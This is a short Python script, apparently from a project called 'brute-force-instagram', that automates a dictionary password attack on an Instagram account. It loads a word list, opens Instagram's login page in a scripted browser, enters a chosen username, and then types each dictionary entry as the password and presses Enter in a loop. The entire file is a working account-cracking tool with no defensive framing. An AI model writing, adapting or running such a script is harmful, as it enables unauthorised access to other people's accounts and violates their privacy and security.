from webbot import Browser
from pynput.keyboard import Key, Controller
import time
username = input('Username: ')

file = open(r'/home/rdonadel/Documenti/brute-force-instagram/dictionary.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()

web = Browser()
keyboard = Controller()


web.go_to('www.instagram.com')
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
web.type(username, into="Numero di telefono, nome utente o e-mail")
keyboard.press(Key.tab)
keyboard.release(Key.tab)
for brute in bruteforce:
    web.type(brute, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    time.sleep(1)